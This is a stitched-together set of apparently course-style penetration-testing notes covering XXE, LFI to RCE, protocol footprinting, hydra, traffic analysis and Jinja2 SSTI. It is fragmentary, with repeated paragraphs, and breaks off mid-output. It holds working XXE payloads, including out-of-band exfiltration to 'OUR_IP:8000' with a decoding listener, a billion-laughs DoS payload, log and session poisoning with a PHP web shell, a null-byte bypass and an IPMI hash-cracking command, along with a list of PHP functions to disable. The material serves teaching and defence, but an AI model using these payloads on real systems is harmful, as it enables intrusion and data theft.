instead of displaying &company; , indicating that we may inject XML code. This confirms that we are dealing with a web application vulnerable to XXE. Reading Sensitive Files \u00b6 <!DOCTYPE email [ <!ENTITY company SYSTEM \"file:///etc/passwd\"> ]> Send the modified request and see whether the value of our external XML entity gets set to the file we reference: Reading Source Code \u00b6 This would allow us to perform a Whitebox Penetration Test to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys. This did not work. This happened because the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity . PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format <!DOCTYPE email [ <!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]> This trick only works with PHP web applications. Other XXE Attacks \u00b6 In addition to reading local files, we may execute commands on the back-end with the PHP://expect filter or utilize a hash stealing trick in Windows-based web applications. One common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload: <?xml version=\"1.0\"?> <!DOCTYPE data [ <!ENTITY a0 \"DOS\" > <!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\"> <!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\"> <!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\"> <!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\"> <!ENTITY a5 \"&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;\"> <!ENTITY a6 \"&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;\"> <!ENTITY a7 \"&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;\"> <!ENTITY a8 \"&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;\"> <!ENTITY a9 \"&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;\"> <!ENTITY a10 \"&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;\"> ]> <root> <name></name> <tel></tel> <email> &a10; </email> <message></message> </root> This payload defines the a0 entity as DOS , references it in a1 multiple times, references a1 in a2 , and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference . Advanced Exfiltration with CDATA \u00b6 Let's try to read the submitDetails.php file by first storing below line in a DTD file (e.g. xxe.dtd ), host it on our machine, and then reference it as an external entity on the target web application hrmns@htb[/htb]$ echo '<!ENTITY joined \"%begin;%file;%end;\">' > xxe.dtd hrmns@htb[/htb]$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Reference our external entity ( xxe.dtd ) and then print the &joined; entity we defined above, which should contain the content of the file: <!DOCTYPE email [ <!ENTITY % begin \"<![CDATA[\"> <!-- prepend the beginning of the CDATA tag --> <!ENTITY % file SYSTEM \"file:///var/www/html/submitDetails.php\"> <!-- reference external file --> <!ENTITY % end \"]]> \"> <!-- append the end of the CDATA tag --> <!ENTITY % xxe SYSTEM \"http://OUR_IP:8000/xxe.dtd\"> <!-- reference our external DTD --> %xxe; ]> ... <email> &joined; </email> <!-- reference the &joined; entity to print the file content --> Once we write our xxe.dtd file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the submitDetails.php file: We were able to obtain the file's source code without needing to encode it to base64, which saves a lot of time when going through various files to look for secrets and passwords. In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop). This trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks. Error Based XXE \u00b6 Try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. <roo> instead of <root> ), or just reference a non-existing entity We cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. First, host a DTD file that contains the following payload: <!ENTITY % file SYSTEM \"file:///etc/hosts\"> <!ENTITY % error \"<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'> \"> Above payload defines the file parameter entity and then joins it with an entity that does not exist. In this case, %nonExistingEntity; does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined %file; as part of the error. Call our external DTD script, and then reference the error entity: <!DOCTYPE email [ <!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"> %remote; %error; ]> Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the /etc/hosts file: This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. \" file:///var/www/html/submitDetails.php \"). However, this method is not as reliable as the previous method for reading source files , as it may have length limitations, and certain special characters may still break it. Blind Data Exfiltration \u00b6 Instead of having the web application output our file entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading. We can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP: <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> <!ENTITY % oob \"<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>\"> If, the file we want to read had the content of XXE_SAMPLE_DATA , then the file parameter would hold its base64 encoded data ( WFhFX1NBTVBMRV9EQVRB ). When the XML tries to reference the external oob parameter from our machine, it will request http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB . Finally, we can decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal: <?php if ( isset ( $_GET [ 'content' ])){ error_log ( \" \\n\\n \" . base64_decode ( $_GET [ 'content' ])); } ?> So, we will first write the above PHP code to index.php , and then start a PHP server on port 8000: hrmns@htb[/htb]$ vi index.php # here we write the above PHP code hrmns@htb[/htb]$ php -S 0 .0.0.0:8000 PHP 7.4.3 Development Server (http://0.0.0.0:8000) started To initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <root>&content;</root> , which is needed to reference our entity and have it send the request to our machine with the file content: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE email [ <!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"> %remote; %oob; ]> <root> &content; </root> Send request to web app: Finally, back to terminal, we did indeed get the request and its decoded content: PHP 7.4.3 Development Server (http://0.0.0.0:8000) started 10.10.14.16:46256 Accepted 10.10.14.16:46256 [200]: (null) /xxe.dtd 10.10.14.16:46256 Closing 10.10.14.16:46258 Accepted root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...SNIP...

hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. According to the FireEye M-Trends Report of 2020 , the average time it took a company to detect hackers was 30 days. With proper hardening, attackers will leave many more signs, and the organization will hopefully detect these events even quicker. It is important to understand the goal of hardening is not to make your system unhackable, meaning you cannot neglect watching logs over a hardened system because it is \"secure\". Hardened systems should be continually tested, especially after a zero-day is released for a related application to your system (ex: Apache Struts, RAILS, Django, etc.). Preventing Directory Traversal \u00b6 If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a universal attack chain. For example, they could: Read /etc/passwd and potentially find SSH Keys or know valid user names for a password spray attack Find other services on the box such as Tomcat and read the tomcat-users.xml file Discover valid PHP Session Cookies and perform session hijacking Read current web application configuration and gain access to the secret used to protect cookies. In some frameworks, this cookie gets unserialized in an unsafe manner, and just reading the configuration can lead to remote code execution The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has basename() which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename. The downside to this method is that if the application needs to enter any directories, it will not be able to do it. Doing the Correct Checks \u00b6 A common attack vector of LFI's happens when applications incorrectly check for malicious things. The most common being using deny lists instead of allow lists . A great example of this is upload forms where the PHP extension gets blocked from being uploaded, not realizing several other extensions exist that have the same functionality (php1, php2, php3, etc.). If an allow list was utilized only to allow jpeg, gif, and png to be accessed, the attack might have been avoided altogether. When validating extensions, be sure the application utilizes the programming languages built-in tools to extract the extension before comparing. If the built-in tools won't suffice for some reason, then utilize Regular Expressions and be sure to place the end of line terminator ($) at the end of user input. If neither of these is done, the application will likely check for an approved extension in the filename, which may not really be the extension (ex: file.php.jpg ). Application Hardening \u00b6 It is often possible to configure the webserver environment to prevent malicious code from running in the first place. There are often ways around application hardening as it prevents behaviors the attackers can avoid. However, attackers will generate error messages trying to get around the application hardening, which grants defenders time to react to a vulnerability. For example, if the system() function is blocked, a log will be created about the blocked functionality being used when an attacker uses it. Hopefully, this is a rare event, and if emails get sent out, the defender may be able to react before the attacker figures out why the event was blocked. This is why web applications should never display error messages to the website ; if the attacker can see why their attack failed, it will be trivial to bypass. To disable this in PHP, edit the php.ini file and verify: display_errors = Off is set. To block system() in PHP, append the functions you want to block to the \"disabled_functions\" lines of PHP. A list of functions recommended blocking is: system, passthru, shell_exec, popen, proc_open, curl_exec, curl_multi_exec, parse_ini_file, show_source It is pretty rare for web applications to load files from remote locations, so it is advised this functionality also be disabled. In PHP this can be done by setting allow_url_fopen and allow_url_include to Off. It's also often possible to jail web applications, preventing them from accessing non-web related files. The most common way to do this in today's age is running the application within Docker . However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding open_basedir = /var/www in the php.ini file Web Application Firewall \u00b6 The universal way to harden applications is to utilize a WAF (Web Application Firewall). When dealing with WAF's, the most important thing to avoid is false positives and blocking non-malicious requests.","title":"Hardening Tips"},{"location":"file_inclusion/hardening_tips/#preventing-directory-traversal","text":"If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a universal attack chain.

LFI vs. RFI \u00b6 Almost any Remote File Inclusion (RFI) can also be a Local File Inclusion (LFI); however, any LFI may not be an RFI. This is primarily because of two reasons: You may only control a portion of the filename and not the entire protocol wrapper (ex: http:// , ftp:// , https:// ) The configuration may prevent RFI all together. For example, in PHP, by setting allow_url_include to 0 , it will not be possible to use remote sources within the include() statement Where it's Common \u00b6 The most common place you will find LFI Vulnerabilities is within templating engines. This is because websites want to keep a large majority of the website the same when navigating between pages, such as the header, navigation bar, and footer. Without dynamic page generation, every page on the server would need to be modified when changes are made to any of those sections. This is why you will often see a parameter like /index.php?page=about . Under the hood, index.php will probably pull header.php , about.php , and footer.php . Since you control the about portion of the request, it may be possible to have the webserver grab other files! Another common place is within languages. If you see ?lang=en ; then the website will grab files from the /en/ directory. Other Places \u00b6 It can be found anytime the server allows a user to download a file. For example, imagine if the server-side code to retrieve your avatar downloaded from /profile/$username/avatar.png . If you managed to craft a malicious username, it might be possible to change that file request to /profile/../../../../etc/passwd avatar.png and grab /etc/passwd instead of your avatar.

For example: language=/etc/passwd%00 will result in the statement include(\"/etc/passwd%00.php\") , where the server ignores everything after the null byte. This occurs because C and C++ consider strings to be terminated by null bytes, while PHP doesn't. The URL encoded null byte (%00) at the end of the filename gets .php appended to it but is truncated to /etc/passwd\\x00 by the APIs written in C.

For example: language=/etc/passwd%00 will result in the statement include(\"/etc/passwd%00.php\") , where the server ignores everything after the null byte. This occurs because C and C++ consider strings to be terminated by null bytes, while PHP doesn't. The URL encoded null byte (%00) at the end of the filename gets .php appended to it but is truncated to /etc/passwd\\x00 by the APIs written in C. This results in the inclusion of /etc/passwd instead of /etc/passwd.php when the include() function is called.","title":"Bypass Using Null Byte"},{"location":"file_inclusion/lfi_to_rce/","text":"LFI can lead to Remote Code Execution (RCE) under some conditions, resulting in a complete server compromise. One common way is to poison log files, which are modified based on requests to the webserver. Try including the Apache access log at /var/log/apache2/access.log http://134.209.184.216:32415/index.php?language=/var/log/apache2/access.log The log contains the remote IP address, request page, response code, and the user-agent string. The User-Agent depends on the user's browser and can be edited by intercepting the request. Start Burp Suite , intercept a request to the page, and send it to Repeater. Next, change the User-Agent header to something else such as Apache Log Poisoning and click Go . We can take advantage of this by setting our User-Agent to a PHP shell such as <?php system($_GET['cmd']); ?> . This gets logged into the file and gets executed by the server as PHP code on inclusion. We can now execute OS-level commands by adding a parameter to the GET request. Some other files that can be included based on the scenario are /var/log/nginx/access.log , /var/log/sshd.log , /var/log/mail , and /var/log/vsftpd.log . On older servers, the /proc/self/environ file can be included, which can be poisoned through the User-Agent string. RCE through PHP Session Files \u00b6 Similar to server log files, PHP saves user sessions on disk. This path is dictated by the session.save_path configuration variable, which is empty by default. In such cases, the session files are saved to the /var/lib/php/sessions/ folder on Linux and C:\\Windows\\Temp on Windows. The name of the session file can be identified from the PHPSESSID cookie. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3 then it's location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3 . The PHPSESSID cookie is found to be stored by the browser.

Next, let's write a PHP web shell to it using the following URL: http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?> We can now include the session file and use the cmd parameter to execute operating system commands. http://134.209.184.216:32415/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten by \" /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd \" during inclusion.","title":"LFI to RCE"},{"location":"file_inclusion/lfi_to_rce/#rce-through-php-session-files","text":"Similar to server log files, PHP saves user sessions on disk.

PS C:\\htb> Add-WindowsFeature Web-Server, Web-Mgmt-Tools SMB / WebDAV \u00b6 SMB is a good option for file transfers, as on Windows as you don\u2019t need to install anything. SMB traffic features prominently on networks, and SMB file transfers to Windows computers are expected. Unfortunately, it\u2019s also the case that outbound SMB traffic is often allowed through the external firewall. In case SMB traffic through the firewall has been restricted, WebDAV may be a good option, as it relies on HTTP as a transport protocol.

As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers ( ICANN ) coordinates the work of the root name servers. There are 13 such root servers around the globe. Authoritative Nameserver Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. Non-authoritative Nameserver Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying. Caching DNS Server Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage. Forwarding Server Forwarding servers perform only one function: they forward DNS queries to another DNS server. Resolver Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router. DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply DNS over TLS ( DoT ) or DNS over HTTPS ( DoH ) here. In addition, the network protocol NSCrypt also encrypts the traffic between the computer and the name server. Default Configuration \u00b6 The DNS server Bind9 is very often used on Linux-based distributions. Local DNS Configuration root@bind9:~# cat /etc/bind/named.conf.local // // Do any local configuration here // // Consider adding the 1918 zones here, if they are not used in your // organization //include \"/etc/bind/zones.rfc1918\"; zone \"domain.com\" { type master; file \"/etc/bind/db.domain.com\"; allow-update { key rndc-key; }; }; In this file, we can define the different zones. These zones are divided into individual files, which in most cases are mainly intended for one domain only. Exceptions are ISP and public DNS servers.

It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. Footprinting the Service \u00b6 IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH. hrmns@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT Nmap scan report for ilo.inlanfreight.local (172.16.2.2) Host is up (0.00064s latency).

When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet. Dangerous Settings \u00b6 If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300 . In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u which tries all combinations of upper case letters and numbers for an eight-character password.

This has a so-called Mail Transfer Agent ( MTA ), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a Mail Submission Agent ( MSA ), which checks the validity, i.e., the origin of the e-mail. This MSA is also called Relay server. The MTA then searches the DNS for the IP address of the recipient mail server. On arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the Mail delivery agent ( MDA ) transfers it to the recipient's mailbox.

In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port 161 . The client can set specific values in the device and change options and settings with these commands. SNMP also enables the use of so-called traps over UDP port 162 . These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side. MIB To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. OID An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. SNMPv3 The security has been increased enormously for SNMPv3 by security features such as username and password and transmission encryption (via pre-shared key ) of the data. Community Strings Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. It is important to note that many organizations are still using SNMPv2, as the transition to SNMPv3 can be very complex, but the services still need to remain active.

This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration. For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If Network Address Translation ( NAT ) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server. Footprinting the Service \u00b6 Scanning the RDP service can quickly give us a lot of information about the host.

WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console ( WMIC ). WMI is not a single program but consists of several programs and various databases, also known as repositories. Footprinting the Service \u00b6 The initialization of the WMI communication always takes place on TCP port 135 , and after the successful establishment of the connection, the communication is moved to a random port.

However, the connectionless UDP protocol can use port 3389 also for remote administration. For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside.

We cannot log in, so we do not know how the page would look like after a successful login, so we cannot specify a success string to look for. /login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string] Fail/Success String \u00b6 To make it possible for hydra to distinguish between successfully submitted credentials and failed attempts, we have to specify a unique string from the source code of the page we're using to log in. Hydra will examine the HTML code of the response page it gets after each attempt, looking for the string we provided. If we provide a fail string, it will keep looking until the string is not found in the response. Another way is if we provide a success string, it will keep looking until the string is found in the response. We can click [Ctrl + U] in Firefox to show the HTML page source, and search for login : < form name = 'login' autocomplete = 'off' class = 'form' action = '' method = 'post' > We will use <form name='login' , which should be distinct enough and will probably not exist after a successful login. So, our syntax for the http-post-form should be as follows: \"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'\" Determine Login Parameters \u00b6 Using Burp Go to Firefox and enable the Burp Proxy . Attempt a login with any username/password 'e.g. admin:admin', and go back to BurpSuite, to find the login request captured: username=admin&password=admin To use in a hydra http-post-form , we can take it as is, and replace the username/password we used admin:admin with USER and PASS .

An understanding of captured network traffic Once we have filtered out the noise, it is time to dig for our targets\u2014filter on things like ftp-data to find any files transferred and reconstruct them. For HTTP, we can filter on http.request.method == \"GET\" to see any GET requests that match the filenames we are searching for. This can show us who has acquired the files and potentially other transfers internal to the network on the same protocols. By capturing traffic around the source of our issue, clearing out any known good data, and then taking the time to inspect and understand what is left, we can determine if it is the cause of our problem. In doing so, we just performed diagnostic analysis. We are validating the cause of our problems and examining the events surrounding them. Predictive Analysis \u00b6 By evaluating historical and current data, predictive analysis creates a predictive model for future probabilities. Based on the results of descriptive and diagnostic analyses, this method of data analysis makes it possible to identify trends, detect deviations from expected values at an early stage, and predict future occurrences as accurately as possible. Note-taking and mind mapping of the found results Annotating everything we do, see, or find throughout the investigation is crucial.

Finally, summarize what we have found explaining the relevant details so that superiors can decide to quarantine the affected hosts or perform more significant incident response. Our analysis will affect decisions made, so it is essential to be as clear and concise as possible. By performing an evaluation of the data we have found, comparing it to our baseline traffic, and known bad data such as markers of infiltration or exploitation (like signatures for viruses and other hacking tools), we are performing Predictive Analysis.

It is usually cyclic, and we will need to rerun steps based on our analysis of the original capture to build a bigger picture. This could have been a much larger attack than what is in the examples. Suppose a full-scale incident response is deemed necessary. In that case, we may have to reanalyze the PCAP previously captured to look at any conversations that involve the affected hosts within several minutes of the executable transfer to ensure it did not spread over another route, as an example. Key Components of an Effective Analysis \u00b6 Know your environment There are several key components to perform traffic analysis effectively. First, know the environment. If we are unsure if a host belongs in the network, how can we determine if it is rogue or not? Keeping asset inventories and network maps is vital. These will aid in the analysis process. Placement is Key The placement of our host for capturing traffic is a critical thing. Closest to the source of the issue is the ideal placement of our capturing tool. If the traffic in question is coming from the internet, listening to the inbound links is a great way to see the complete picture. It is as close to the source as we, the administrators, can get. If the problem seems to be isolated to one host on our internal network, try placing the capture tools in the same segment as the problem host and see what traffic is happening within the segment. Persistence Persistence is the next critical component for us. The issue will not always be easy to spot. It may not even be a frequent event on the network. For example, an attacker's Command and Control server reaching out to the victim's computers may only happen on a time interval of once every several hours, or even once a day or less. This means that if we did not catch it the first time around, it might be a while before it appears in our logs. Don't lose the drive to find the problem. It could mean the difference between stopping the attacker and a full-scale breach like a ransomware attack.","title":"Analysis"},{"location":"network_traffic_analysis/analysis/#descriptive-analysis","text":"Descriptive analysis is an essential step in any data analysis.

It uses / notation. proto will filter for a specific protocol type. (ether, TCP, UDP, and ICMP as examples) port port is bi-directional. It will show any traffic with the specified port as the source or destination. portrange portrange allows us to specify a range of ports.

Bi-directional src / dest src and dest are modifiers. We can use them to designate a source or destination host or port. net net will show us any traffic sourcing from or destined to the network designated. It uses / notation. proto will filter for a specific protocol type. (ether, TCP, UDP, and ICMP as examples) port port is bi-directional. It will show any traffic with the specified port as the source or destination. portrange portrange allows us to specify a range of ports. (0-1024) less / greater \"< >\" less and greater can be used to look for a packet or protocol option of a specific size. and / && and && can be used to concatenate two different filters together. for example, src host AND port. or or allows for a match on either of two conditions. It does not have to meet both. It can be tricky. not not is a modifier saying anything but x.

Following TCP Streams Wireshark can stitch TCP packets back together to recreate the entire stream in a readable format. This ability also allows us to pull data ( images, files, etc. ) out of the capture. This works for almost any protocol that utilizes TCP as a transport mechanism.

Before moving to the payload development part, let's look at some Python for SSTI. Python Primer for SSTI \u00b6 Below is a small dictionary from fatalerrors.org to refer to when going over the Jinja2 payload development part No. Methods Description 1. __class__ Returns the object (class) to which the type belongs 2. __mro__ Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples. 3. __subclasses__ Each new class retains references to subclasses, and this method returns a list of references that are still available in the class 4. __builtins__ Returns the builtin methods included in a function 5. __globals__ A reference to a dictionary that contains global variables for a function 6. __base__ Returns the base class inherited by the object <-- (__ base__ and __ mro__ are used to find the base class) 7. __init__ Class initialization method hrmns@htb[/htb]$ python3 Python 3.9.2 (default, Feb 28 2021, 17:03:44) [GCC 10.2.1 20210110] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> Create a string object and use type and __class__ , as follows. Then use the dir() command to show all methods and attributes from the object. >>> import flask >>> s = 'HTB' >>> type ( s ) < class ' str '> >>> s . __class__ < class ' str '> >>> dir ( s ) [ '__add__' , '__class__' , '__contains__' , '__delattr__' , '__dir__' , '__doc__' , '__eq__' , '__format__' , '__ge__' , '__getattribute__' , '__getitem__' , '__getnewargs__' , '__gt__' , '__hash__' , '__init__' , '__init_subclass__' , '__iter__' , '__le__' , '__len__' , '__lt__' , '__mod__' , '__mul__' , '__ne__' , '__new__' , '__reduce__' , '__reduce_ex__' , '__repr__' , '__rmod__' , '__rmul__' , '__setattr__' , '__sizeof__' , '__str__' , '__subclasshook__' , 'capitalize' , 'casefold' , 'center' , 'count' , 'encode' , 'endswith' , 'expandtabs' , 'find' , 'format' , 'format_map' , 'index' , 'isalnum' , 'isalpha' , 'isascii' , 'isdecimal' , 'isdigit' , 'isidentifier' , 'islower' , 'isnumeric' , 'isprintable' , 'isspace' , 'istitle' , 'isupper' , 'join' , 'ljust' , 'lower' , 'lstrip' , 'maketrans' , 'partition' , 'replace' , 'rfind' , 'rindex' , 'rjust' , 'rpartition' , 'rsplit' , 'rstrip' , 'split' , 'splitlines' , 'startswith' , 'strip' , 'swapcase' , 'title' , 'translate' , 'upper' , 'zfill' ] The next step is to understand Python's hierarchy. Using __mro__ or mro() , we can go back up to three inherited objects in the Python environment. Let's practice this as follows. >>> s . __class__ . __class__ < class ' type '> >>> s . __class__ . __base__ < class ' object '> >>> s . __class__ . __base__ . __subclasses__ () [ < class ' type '>, <class ' weakref '>, <class ' weakcallableproxy '>, <class ' weakproxy '>, <class ' int '>, <class ' bytearray '>, <class ' bytes '>, <class ' list '>, <class ' NoneType '>, <class ' NotImplementedType '>, <class ' traceback '>, <class ' super '>, <class ' range '>, <class ' dict '>, <class ' dict_keys '>, <class ' dict_values '>, <class ' dict_items '>, <class ' dict_reversekeyiterator '>, <class ' dict_reversevalueiterator '>, <class ' dict_reverseitemiterator '>, <class ' odict_iterator '>, <class ' set '>, <class ' str '>, <class ' slice '>, <class ' staticmethod '>, <class ' complex '>, <class ' float '>, <class ' frozenset '>, <class ' property '>, <class ' managedbuffer '>, <class ' memoryview '>, <class ' tuple '>, <class ' enumerate '>, <class ' reversed '>, <class ' stderrprinter '>, <class ' code '>, <class ' frame '>, <class ' builtin_function_or_method '>, <class ' method '>, < SNIP > >>> s . __class__ . mro ()[ 1 ] . __subclasses__ () [ < class ' type '>, <class ' weakref '>, <class ' weakcallableproxy '>, <class ' weakproxy '>, <class ' int '>, <class ' bytearray '>, <class ' bytes '>, <class ' list '>, <class ' NoneType '>, <class ' NotImplementedType '>, <class ' traceback '>, <class ' super '>, <class ' range '>, <class ' dict '>, <class ' dict_keys '>, <class ' dict_values '>, <class ' dict_items '>, <class ' dict_reversekeyiterator '>, <class ' dict_reversevalueiterator '>, <class ' dict_reverseitemiterator '>, <class ' odict_iterator '>, <class ' set '>, <class ' str '>, <class ' slice '>, <class ' staticmethod '>, <class ' complex '>, <class ' float '>, <class ' frozenset '>, <class ' property '>, <class ' managedbuffer '>, <class ' memoryview '>, <class ' tuple '>, <class ' enumerate '>, <class ' reversed '>, <class ' stderrprinter '>, <class ' code '>, <class ' frame '>, <class ' builtin_function_or_method '>, <class ' method '>, < SNIP > Let us look for useful classes that can facilitate remote code execution. >>> x = s . __class__ . mro ()[ 1 ] . __subclasses__ () >>> for i in range ( len ( x )): print ( i , x [ i ] . __name__ ) ... 0 type 1 weakref 2 weakcallableproxy 3 weakproxy 4 int 5 bytearray 6 bytes 7 list 8 NoneType < SNIP > >>> def searchfunc ( name ): ... x = s . __class__ . mro ()[ 1 ] . __subclasses__ () ... for i in range ( len ( x )): ... fn = x [ i ] . __name__ ... if fn . find ( name ) > - 1 : ... print ( i , fn ) ... >>> searchfunc ( 'warning' ) 215 catch_warnings Why are we searching for warning you may ask. We chose this class because it imports Python's sys module , and from sys , the os module can be reached. More precisely, os modules are all from warnings.catch_ . We have seen that catch_warnings is present without importing any additional module to our Python console. Let's enumerate the builtins from this class: >>> y = x [ 215 ] >>> y < class ' warnings . catch_warnings '> >>> y () . _module . __builtins__ { '__name__' : 'builtins' , '__doc__' : \"Built-in functions, exceptions, and other objects. \\n\\n Noteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\" , '__package__' : '' , '__loader__' : < class ' _frozen_importlib . BuiltinImporter '>, ' __spec__ ': ModuleSpec(name=' builtins ', loader=<class ' _frozen_importlib . BuiltinImporter '>), ' __build_class__ ': <built-in function __build_class__>, ' __import__ ': <built-in function __import__>, ' abs ': <built-in function abs>, ' all ': <built-in function all>, ' any ': <built-in function any>, ' ascii ': <built-in function ascii>, ' bin ': <built-in function bin>, ' breakpoint ': <built-in function breakpoint>, ' callable ': <built-in function callable>, ' chr ': <built-in function chr>, ' compile ': <built-in function compile>, ' delattr ': <built-in function delattr>, ' dir ': <built-in function dir>, ' divmod ': <built-in function 